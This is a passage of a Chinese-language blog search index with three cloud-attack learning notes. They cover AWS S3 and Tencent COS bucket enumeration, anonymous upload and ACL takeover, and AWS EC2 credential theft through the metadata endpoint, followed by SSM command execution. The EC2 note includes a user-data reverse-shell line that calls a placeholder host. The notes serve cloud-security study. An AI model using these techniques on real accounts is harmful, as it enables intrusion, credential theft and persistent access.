<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>AmazonS3攻击利用</title>
      <link href="2022/05/14/amazons3-gong-ji-li-yong/"/>
      <url>2022/05/14/amazons3-gong-ji-li-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="line-numbers language-none"><code class="language-none">Amazon S3是一项对象存储服务，提供业界领先的可扩展性、数据可用性、安全性和性能。Web应用程序开发人员可以使用它存储数字资产，包括图片、视频、音乐和文档。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Bucket访问"><a href="#Bucket访问" class="headerlink" title="Bucket访问"></a>Bucket访问</h2><pre class="line-numbers language-none"><code class="language-none">整体功能创建同阿里云、腾讯云相仿，无特别大的其他操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/c0fa3791502bd234f5f519a424b24054.png"></p><pre class="line-numbers language-none"><code class="language-none">访问如下，AccessDenied<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/5d0576bd1fa647154e3fe601075907b0.png"></p><pre class="line-numbers language-none"><code class="language-none">此处可配置ACL规则如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/986b999065f5da375553797fb1fa36a6.png"></p><h2 id="Bucket爆破"><a href="#Bucket爆破" class="headerlink" title="Bucket爆破"></a>Bucket爆破</h2><pre class="line-numbers language-none"><code class="language-none">同阿里云一样，不存在的Bucket返回NoSuchBucket，结合字典可进步通过返回包内容进行判断<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/16cae9cc17bffc12398ae5d778f9205f.png"></p><h3 id="Bucket遍历"><a href="#Bucket遍历" class="headerlink" title="Bucket遍历"></a>Bucket遍历</h3><pre class="line-numbers language-none"><code class="language-none">如下设置Bucketacl配置即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/99db8b39fe7732a64a477b9b22e704ae.png"></p><pre class="line-numbers language-none"><code class="language-none">如果没有权限，可以进步基于爆破出来的Bucket同理爆破key值，从而访问业务资源<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Bucket文件上传"><a href="#Bucket文件上传" class="headerlink" title="Bucket文件上传"></a>Bucket文件上传</h2><pre class="line-numbers language-none"><code class="language-none">当匿名用户具备写入权限时，即可对Bucket进行文件上传，甚至覆盖原有文件，原始权限如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/5adab1b7de9ae8677f66bcc9cc14915f.png"></p><pre class="line-numbers language-none"><code class="language-none">利用PUT方法可直接对文件进行上传<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/78bfc08b9f6c57d7c836ba84a80775f1.png"></p><pre class="line-numbers language-none"><code class="language-none">acl补充：&#123;    &quot;Owner&quot;: &#123;        &quot;ID&quot;: &quot;e6b65b&quot;    &#125;,    &quot;Grants&quot;: [        &#123;            &quot;Grantee&quot;: &#123;                &quot;Type&quot;: &quot;Group&quot;,                &quot;URI&quot;: &quot;http:&#x2F;&#x2F;acs.amazonaws.com&#x2F;groups&#x2F;global&#x2F;AllUsers&quot;            &#125;,            &quot;Permission&quot;: &quot;READ&quot;        &#125;,        &#123;            &quot;Grantee&quot;: &#123;                &quot;Type&quot;: &quot;Group&quot;,                &quot;URI&quot;: &quot;http:&#x2F;&#x2F;acs.amazonaws.com&#x2F;groups&#x2F;global&#x2F;AllUsers&quot;            &#125;,            &quot;Permission&quot;: &quot;WRITE&quot;        &#125;,        &#123;            &quot;Grantee&quot;: &#123;                &quot;Type&quot;: &quot;Group&quot;,                &quot;URI&quot;: &quot;http:&#x2F;&#x2F;acs.amazonaws.com&#x2F;groups&#x2F;global&#x2F;AllUsers&quot;            &#125;,            &quot;Permission&quot;: &quot;READ_ACP&quot;        &#125;,        &#123;            &quot;Grantee&quot;: &#123;                &quot;Type&quot;: &quot;Group&quot;,                &quot;URI&quot;: &quot;http:&#x2F;&#x2F;acs.amazonaws.com&#x2F;groups&#x2F;global&#x2F;AllUsers&quot;            &#125;,            &quot;Permission&quot;: &quot;WRITE_ACP&quot;        &#125;    ]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Bucketacl修改"><a href="#Bucketacl修改" class="headerlink" title="Bucketacl修改"></a>Bucketacl修改</h2><pre class="line-numbers language-none"><code class="language-none">同阿里云相仿，此处AWS也可以利用cli来访问和修改，如匿名用户具备对acl的读写权限，但访问Bucket却无法访问<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/df3554d6a17692018faab71895ca4ee5.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/d08b60abe9dad54c8ef771983fe6ca50.png"></p><pre class="line-numbers language-none"><code class="language-none">获取acl信息https:&#x2F;&#x2F;yangsirrr.s3.eu-central-1.amazonaws.com&#x2F;?acl确认为READ_ACP、WRITE_ACP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/a78aa198bed9ca4b6768f7a4684ae1d8.png"></p><pre class="line-numbers language-none"><code class="language-none">用客户端同理可获取查看官方文档对其描述<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/0f744671a62abd1190ff880586a45afe.png"></p><pre class="line-numbers language-none"><code class="language-none">此处可以直接利用客户端写入FULL_CONTROL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/86be4fe93caa418c8fedad228158db51.png"></p><pre class="line-numbers language-none"><code class="language-none">修改效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/3109aca015686274c81fecee96d36b69.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/4dc3276cf7004a8962e0e341009faec3.png"></p><pre class="line-numbers language-none"><code class="language-none">用客户端来listobject同理<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/66c20fbf9761a09dd315ff2092e1416d.png"></p><pre class="line-numbers language-none"><code class="language-none">完全控制同理可进步文件上传等操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/2f29ad873942c0b8185a5539e9cdf768.png"></p><h2 id="Bucket特殊策略配置"><a href="#Bucket特殊策略配置" class="headerlink" title="Bucket特殊策略配置"></a>Bucket特殊策略配置</h2><pre class="line-numbers language-none"><code class="language-none">设定指定的ip不能访问业务资源，其他ip可正常访问，正常访问结果如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/203f4f56146ddd629d96aa1e62ed0608.png"></p><pre class="line-numbers language-none"><code class="language-none">规则如下，deny掉104开头的某个地址&#123;    &quot;Version&quot;: &quot;2012-10-17&quot;,    &quot;Statement&quot;: [        &#123;            &quot;Sid&quot;: &quot;Statement1&quot;,            &quot;Effect&quot;: &quot;Deny&quot;,            &quot;Principal&quot;: &quot;*&quot;,            &quot;Action&quot;: &quot;s3:GetObject&quot;,            &quot;Resource&quot;: &quot;arn:aws:s3:::yangsirflkf&#x2F;yyy.txt&quot;,            &quot;Condition&quot;: &#123;                &quot;IpAddressIfExists&quot;: &#123;                    &quot;aws:SourceIp&quot;: &quot;104.XXXXX&quot;                &#125;            &#125;        &#125;    ]&#125;访问后效果如下，其他不在规则中的资源不受影响<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/e2cc270b8abef5589215f6c4a42ded01.png"></p><h3 id="影响可用性"><a href="#影响可用性" class="headerlink" title="影响可用性"></a>影响可用性</h3><pre class="line-numbers language-none"><code class="language-none">此处需要具备GetBucketPolicy、PutBucketPolicy权限，如上面先前的Deny的ip进行修改为Allow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/4d2a8f96f71f4869001a49ff0826d603.png"></p><pre class="line-numbers language-none"><code class="language-none">上传后，再次访问业务效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/698c4a8cbe9c4f355186c49b653abb14.png"></p><h2 id="Bucket接管"><a href="#Bucket接管" class="headerlink" title="Bucket接管"></a>Bucket接管</h2><pre class="line-numbers language-none"><code class="language-none">访问某子域名，显示NoSuchBucket，可尝试进行接管利用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/3086b2e2a98fcc58e3102d6d54c3215c.png"></p><pre class="line-numbers language-none"><code class="language-none">创建同名的S3，域名访问相同的文件路径，确认上传成功如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awss3/0bd410d7e6caece3ee8d109f8feda911.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudSecurity </tag>
            
            <tag> AmazonS3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AmazonEC2攻击利用</title>
      <link href="2022/05/14/amazonec2-gong-ji-li-yong/"/>
      <url>2022/05/14/amazonec2-gong-ji-li-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="line-numbers language-none"><code class="language-none">AmazonEC2-Amazon Elastic Compute Cloud云服务器是一种Web云服务，能在云中提供安全且可调整大小的计算能力<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="敏感信息获取"><a href="#敏感信息获取" class="headerlink" title="敏感信息获取"></a>敏感信息获取</h2><pre class="line-numbers language-none"><code class="language-none">除了常规可通过github、源代码泄露、反编译应用程序、配置文件泄露序等方式收集相关AKSK凭证信息，还可以基于元数据进行信息获取其中元数据服务是一种提供查询运行中的实例内元数据的服务，通过已经获得的实例向元数据服务发起请求是不会通过网络传输的，如进步利用已获得的实例EC2权限获取实例元数据信息通过相关的元数据信息除了获取基本的属性外，若服务器提前配置了IAM角色，则能够进步获取相关角色的凭证信息，从而进步利用基本IAM角色配置如下，如果没有的话直接新建下新的角色就行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/39c7625ecd8f44c984a5e6c8436d3b5f.png"></p><pre class="line-numbers language-none"><code class="language-none">通过各种方法，获取了当前机器权限后，进步查看所有类别的元数据如下curl http:&#x2F;&#x2F;169.254.169.254&#x2F;latest&#x2F;meta-data包含各类基本信息如下，如网络信息、主机名等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/cf575f99ce03c518f88357b6bc7bedbd.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/8c9ab235618f2ed4be5cb830c4ea507a.png"></p><pre class="line-numbers language-none"><code class="language-none">进步角色凭证获取curl http:&#x2F;&#x2F;169.254.169.254&#x2F;latest&#x2F;meta-data&#x2F;iam&#x2F;security-credentials&#x2F;EC2S3此处凭证是由提供的应用策略权限所决定，若权限较小也无法进步横向利用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/91322d8e6dc9693eb894273c20751189.png"></p><h2 id="凭证利用"><a href="#凭证利用" class="headerlink" title="凭证利用"></a>凭证利用</h2><h3 id="网页控制台"><a href="#网页控制台" class="headerlink" title="网页控制台"></a>网页控制台</h3><pre class="line-numbers language-none"><code class="language-none">如基于先前元数据获得的AKSK等，进步利用pacu工具，通过生成的链接进入控制台<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/2d926bda4ab153ebf7782da2dd134612.png"></p><pre class="line-numbers language-none"><code class="language-none">利用获得的登录地址随便开个浏览器登录控制台，进入对应区域服务器即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/657016e22f6ee21b7f8845136e4795b0.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/ea61cbd7ff673f384649b0a2c277be9c.png"></p><pre class="line-numbers language-none"><code class="language-none">除此之外也可从网页利用AWS Systems Manager基于runshellscript命令执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/a73a289bed2832ee84e572e1ae87fb00.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/96c5607cfcd55bcbc024c1738fc2a4c5.png"></p><pre class="line-numbers language-none"><code class="language-none">运行成功如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/1e59bd83442ce5b4580f9eb2d335f5c9.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/e0baca8b099d9fc4d193859132b3510d.png"></p><pre class="line-numbers language-none"><code class="language-none">除此之外获取网页控制台后可查看子网信息，为进步横向移动进行信息收集<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/7433386f4457f360700a80279dc6af9a.png"></p><pre class="line-numbers language-none"><code class="language-none">除pacu外其他工具也可以同理生成链接进入控制台<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/a17e38bd16c82b82c19b39bc1337d8f1.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/f09ea9fc544033a45d644f14ddac5f60.png"></p><pre class="line-numbers language-none"><code class="language-none">在机器可重启的情况下可利用用户数据进步执行命令，此处编辑数据是需要停止用户实例的，且停止实例后ip会变动！！！<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/26d33b5cd6fca5ce93dd299c0e718f36.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/98aef8276150a9d904967b4e8843a422.png"></p><pre class="line-numbers language-none"><code class="language-none">官方提供的文件模板直接写反弹shell如下Content-Type: multipart&#x2F;mixed; boundary&#x3D;&quot;&#x2F;&#x2F;&quot;MIME-Version: 1.0--&#x2F;&#x2F;Content-Type: text&#x2F;cloud-config; charset&#x3D;&quot;us-ascii&quot;MIME-Version: 1.0Content-Transfer-Encoding: 7bitContent-Disposition: attachment; filename&#x3D;&quot;cloud-config.txt&quot;# cloud-configcloud_final_modules:- [scripts-user, always]--&#x2F;&#x2F;Content-Type: text&#x2F;x-shellscript; charset&#x3D;&quot;us-ascii&quot;MIME-Version: 1.0Content-Transfer-Encoding: 7bitContent-Disposition: attachment; filename&#x3D;&quot;userdata.txt&quot;# !&#x2F;bin&#x2F;bashbash -c &#39;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;XXXXX&#x2F;XXX &lt;&amp;1&#39;--&#x2F;&#x2F;--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/f7b97f62d15a4858cff8a795bb37d5f1.png"></p><pre class="line-numbers language-none"><code class="language-none">或者不用文件格式，直接创建文件也可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/eab8198e7c8b9536c3c095e4bd15700b.png"></p><pre class="line-numbers language-none"><code class="language-none">基于先前提及的元数据也可以获取用户数据信息如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/ce736aba56f9d38276e289f0aeaa0a91.png"></p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><pre class="line-numbers language-none"><code class="language-none">获取要执行的实例服务器idaws ec2 describe-instances --output text<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/c7d4fc4ecc6efb4f148a0508f6ef6892.png"></p><pre class="line-numbers language-none"><code class="language-none">过滤出可用区、当前状态、对应的实例idaws ec2 describe-instances --query &#39;Reservations[*].Instances[*].[Placement.AvailabilityZone, State.Name, InstanceId]&#39; --output text<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/3db09ccf0334d9469d85dc15f7d1a498.png"></p><pre class="line-numbers language-none"><code class="language-none">aws ssm send-command --document-name &quot;AWS-RunShellScript&quot; --document-version &quot;1&quot; --targets &#39;[&#123;&quot;Key&quot;:&quot;InstanceIds&quot;,&quot;Values&quot;:[&quot;i-123456&quot;]&#125;]&#39; --parameters &#39;&#123;&quot;workingDirectory&quot;:[&quot;&quot;],&quot;executionTimeout&quot;:[&quot;3600&quot;],&quot;commands&quot;:[&quot;ifconfig&quot;]&#125;&#39;  --output text需要记录好命令id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/38d3c30bf06cb836cf3bc2a26cd765b3.png"></p><pre class="line-numbers language-none"><code class="language-none">aws ssm list-command-invocations --command-id 123456 --details  --output text<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/e64234347a4174aabc72e834a3fe9ece.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/43b0ca2fe2777324e22f6114939636db.png"></p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><pre class="line-numbers language-none"><code class="language-none">除了先前的用户数据，基于写入反弹shell，从而当用户机器重启的时候可以进而弹回权限，但可能很多机器不会随意重启，普适性较低还可通过网页创建新的密钥，后续利用该高权限AKSK进步开展渗透工作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/95a534c2468937e0e9a2395ee8591db9.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/00aee7932191a6c6155a964bed9fd2df.png"></p><pre class="line-numbers language-none"><code class="language-none">当权限足够的情况下也可利用子账户创建高权限账户，后续直接利用子账户即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/awsec2/a56b38502c2d9a36605674b3859e9e3d.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudSecurity </tag>
            
            <tag> AmazonEC2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯云COS攻击利用</title>
      <link href="2022/05/10/teng-xun-yun-cos-gong-ji-li-yong/"/>
      <url>2022/05/10/teng-xun-yun-cos-gong-ji-li-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="line-numbers language-none"><code class="language-none">对象存储COS-Cloud Object Storage，是由腾讯云推出的无目录层次结构、无数据格式限制，可容纳海量数据且支持 HTTP&#x2F;HTTPS 协议访问的分布式存储服务。腾讯云 COS 的存储桶空间无容量上限，无需分区管理，适用于 CDN 数据分发、数据万象处理或大数据计算与分析的数据湖等多种场景<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Bucket访问"><a href="#Bucket访问" class="headerlink" title="Bucket访问"></a>Bucket访问</h2><pre class="line-numbers language-none"><code class="language-none">腾讯云创建Bucket存储桶时，自定义名字后面会带一串id，同阿里云OSS有所不同，将导致部分利用点无法利用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/f48f636529fc2a611b36b24cc5f66cb5.png"></p><pre class="line-numbers language-none"><code class="language-none">其他点基本同阿里云相仿<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/1180614e0f7e0937f1b1249df89c7fbc.png"></p><pre class="line-numbers language-none"><code class="language-none">访问如下，无listobject<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/04fae640b25083a9c5d2bf9263f836f0.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/2ad90f38f9de7009e723041958fbc630.png"></p><pre class="line-numbers language-none"><code class="language-none">若为私有则资源也无法访问<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/5da34b03a97b4d121e8682d421c7d3f7.png"></p><h2 id="Bucket爆破"><a href="#Bucket爆破" class="headerlink" title="Bucket爆破"></a>Bucket爆破</h2><pre class="line-numbers language-none"><code class="language-none">同阿里云一样，不存在的Bucket返回NoSuchBucket，结合字典可进步通过返回包内容进行判断<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/ee83b27ac9d1eea47a852c6e8cd0bfa2.png"></p><h3 id="Bucket遍历"><a href="#Bucket遍历" class="headerlink" title="Bucket遍历"></a>Bucket遍历</h3><pre class="line-numbers language-none"><code class="language-none">如下设置Bucket下的listobject<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/7af6187f8420e76530ee144e6995829c.png"></p><pre class="line-numbers language-none"><code class="language-none">配置效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/03937b09c7cc163ec6a7f2c40b3c3331.png"></p><pre class="line-numbers language-none"><code class="language-none">如进行对Bucket爆破后，访问对应Bucket即可遍历Object，进步可对资源文件进行下载<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/f41e89124d3205acc77c4960636d86fb.png"></p><h2 id="Bucket文件上传"><a href="#Bucket文件上传" class="headerlink" title="Bucket文件上传"></a>Bucket文件上传</h2><pre class="line-numbers language-none"><code class="language-none">当匿名用户具备PUT写入权限时，即可对Bucket进行文件上传，甚至覆盖原有文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/af7e6d8c07b7daf7e88b0a3976e50f45.png"></p><pre class="line-numbers language-none"><code class="language-none">Get方法获取文件如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/fe321be06fd7f74934520324cccef875.png"></p><pre class="line-numbers language-none"><code class="language-none">利用PUT方法可直接对文件进行上传<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/0c33736c31c0ce8bd07e677535012e9e.png"></p><pre class="line-numbers language-none"><code class="language-none">成功如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/eb961fa83bcafeac54afe2d2cb4a2e91.png"></p><h2 id="Bucketacl修改"><a href="#Bucketacl修改" class="headerlink" title="Bucketacl修改"></a>Bucketacl修改</h2><pre class="line-numbers language-none"><code class="language-none">同阿里云不用的是，腾讯云cos不需要通过客户端来访问或修改，如匿名用户仅具备对acl的get、put权限，此刻访问Bucket及对应资源均无权访问<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/919cd26afa364a36885c0937f7e11c61.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/b8c4db6376f1589e24fc3afe12b2aaab.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/60a9bc822114f1dfbc1f3f4b5c9c2dc8.png"></p><pre class="line-numbers language-none"><code class="language-none">获取acl信息https:&#x2F;&#x2F;yangsir123123-1251570207.cos.ap-hongkong.myqcloud.com&#x2F;?acl确认为FULL_CONTROL，具备完全控制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/c2456abc0a2a537e08cf26d845ac6b2d.png"></p><pre class="line-numbers language-none"><code class="language-none">查看官方文档，利用put修改aclhttps:&#x2F;&#x2F;cloud.tencent.com&#x2F;document&#x2F;product&#x2F;436&#x2F;30752#.E6.93.8D.E4.BD.9C-permission<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/2336678b7af1d99f203888c2e04d948b.png"></p><pre class="line-numbers language-none"><code class="language-none">修改效果如下PUT  &#x2F;?acl  HTTP&#x2F;1.1Host: yangsir123123-1251570207.cos.ap-hongkong.myqcloud.comx-cos-acl: public-read-writeUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko&#x2F;20100101 Firefox&#x2F;99.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Cache-Control: max-age&#x3D;0Content-Length: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img 